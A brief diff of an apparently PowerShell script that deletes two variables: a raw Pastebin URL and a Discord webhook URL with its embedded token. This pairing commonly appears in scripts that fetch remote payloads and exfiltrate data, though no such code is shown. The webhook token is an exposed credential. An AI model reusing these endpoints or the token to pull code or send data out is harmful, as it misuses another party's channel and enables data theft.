@@ -1,6 +1,5 @@
 
-$bin = "https://pastebin.com/raw/q3byS8Km"
-$hookurl = "https://discord.com/api/webhooks/1186256849985605692/HOuOJ-xe6NBS6erGC7F7OFGnCrsV_BVK-i5B7ca8QiT0vACpxIqpOUe09HtdMcdinNI0"
+
 
 #Welcome message
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
